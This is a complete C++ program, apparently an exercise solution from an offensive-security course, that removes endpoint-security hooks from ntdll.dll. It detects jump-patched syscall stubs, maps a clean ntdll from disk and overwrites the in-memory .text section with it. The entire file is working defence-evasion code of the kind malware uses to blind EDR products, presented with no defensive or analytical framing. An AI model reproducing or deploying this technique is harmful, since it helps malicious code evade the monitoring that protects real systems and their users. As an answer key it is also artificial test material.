/*
  Solution 02 — NTDLL Unhooking (complete)
*/
#include <windows.h>
#include <stdio.h>

bool isHooked(const char* funcName) {
    PBYTE stub = (PBYTE)GetProcAddress(GetModuleHandleA("ntdll.dll"), funcName);
    if (!stub) return false;
    return (stub[0] == 0xE9 || stub[0] == 0xFF);
}

PVOID mapCleanNtdll() {
    const char* path = "C:\\Windows\\System32\\ntdll.dll";
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return nullptr;

    HANDLE hMap = CreateFileMappingA(hFile, nullptr,
                                      PAGE_READONLY | SEC_IMAGE_NO_EXECUTE,
                                      0, 0, nullptr);
    CloseHandle(hFile);
    if (!hMap) return nullptr;

    PVOID base = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    return base;
}

struct SectionInfo { DWORD rva; DWORD size; };

SectionInfo findTextSection(PVOID moduleBase) {
    SectionInfo result = {};
    PBYTE base = (PBYTE)moduleBase;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(base + dos->e_lfanew);
    WORD numSec = nt->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < numSec; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            result.rva  = sec->VirtualAddress;
            result.size = sec->SizeOfRawData;
            break;
        }
    }
    return result;
}

bool unhookNtdll(PVOID cleanBase) {
    HMODULE inMemBase = GetModuleHandleA("ntdll.dll");
    if (!inMemBase || !cleanBase) return false;

    SectionInfo sec = findTextSection(cleanBase);
    if (!sec.rva || !sec.size) return false;

    PBYTE src = (PBYTE)cleanBase + sec.rva;
    PBYTE dst = (PBYTE)inMemBase + sec.rva;

    DWORD old;
    if (!VirtualProtect(dst, sec.size, PAGE_EXECUTE_READWRITE, &old)) {
        printf("[-] VirtualProtect failed: %lu\n", GetLastError());
        return false;
    }
    memcpy(dst, src, sec.size);
    VirtualProtect(dst, sec.size, old, &old);
    FlushInstructionCache(GetCurrentProcess(), dst, sec.size);
    return true;
}

int main() {
    const char* testFunc = "NtAllocateVirtualMemory";
    printf("[*] %s hooked before: %s\n", testFunc, isHooked(testFunc) ? "YES" : "no");

    PVOID clean = mapCleanNtdll();
    if (!clean) { printf("[-] mapCleanNtdll failed\n"); return 1; }

    if (unhookNtdll(clean)) {
        printf("[+] NTDLL unhooked\n");
        printf("[*] %s hooked after:  %s\n", testFunc, isHooked(testFunc) ? "STILL HOOKED" : "no (clean)");
    }
    UnmapViewOfFile(clean);
    return 0;
}
